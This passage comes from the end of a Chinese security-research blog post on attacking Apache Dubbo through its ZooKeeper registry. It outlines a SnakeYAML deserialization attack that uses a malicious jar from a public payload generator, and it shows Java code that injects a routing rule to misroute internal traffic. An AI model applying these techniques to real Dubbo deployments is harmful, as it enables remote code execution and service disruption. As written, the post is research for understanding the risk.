+<p>其次需要准备触发所需的 SPI 配置文件，以及待执行的 jar包。这里可以直接使用开源的脚本（<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload%EF%BC%89%EF%BC%8C%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fjar%E5%8C%85%E5%90%8E%E6%8C%89%E7%85%A7%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E4%BD%BF%E7%94%A8python%E6%90%AD%E5%BB%BAHTTP">https://github.com/artsploit/yaml-payload），生成恶意jar包后按照目录结构使用python搭建HTTP</a> Server。</p>
+<p>先启动服务端代码，再运行消费者代码，即可触发漏洞。（因为自己没有环境所以便没有真正利用成功，在yaml.load()处报了错）</p>
+<p>总结：实质上就是找到了一处snakeyaml的漏洞sink点，然后解决这两个问题：</p>
+<ol>
+<li><p>在 ZK 哪个节点中添加恶意 yaml 数据 ？</p>
+</li>
+<li><p>如何让消费者读取并解析这个 yaml 数据 ？</p>
+</li>
+</ol>
+<p>即可利用成功。</p>
+<h3 id="3、错误路由"><a href="#3、错误路由" class="headerlink" title="3、错误路由"></a>3、错误路由</h3><p>此种风险无法达到远程命令执行的目的，但是在内网中，一旦业务被错误路由将会导致业务运行错误或中断。</p>
+<p>Dubbo路由分为：条件路由（默认配置即可实现）、标签路由（此种方式必须修改provider或者consumer配置文件实现）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RegistryFactory</span> <span class="hljs-variable">registryFactory</span> <span class="hljs-operator">=</span> ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();<br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> registryFactory.getRegistry(URL.valueOf(<span class="hljs-string">&quot;zookeeper://0.0.0.0:2181&quot;</span>));<br>registry.register(URL.valueOf(<span class="hljs-string">&quot;conditions://0.0.0.0/com.foo.BarService?category=routers&amp;dynamic=false&amp;rule=&quot;</span><br>            + URL.encode(<span class="hljs-string">&quot;host = 10.20.153.10 =&gt; host = 10.20.153.11&quot;</span>)));<br></code></pre></td></tr></table></figure>
+
+<p>第一个host：匹配consumer的条件</p>
+<p>第二个host：匹配provider的条件</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">#云安全</a>
+      
+        <a href="/tags/Dubbo/">#Dubbo</a>
+      
+        <a href="/tags/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">#应用安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DUBBO安全研究--Zookeeper篇</div>
+      <div>http://example.com/2023/03/27/DUBBO安全研究-Zookeeper篇/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>FanneF</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/27/Serverless%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" title="Serverless架构安全概览">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Serverless架构安全概览</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/22/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
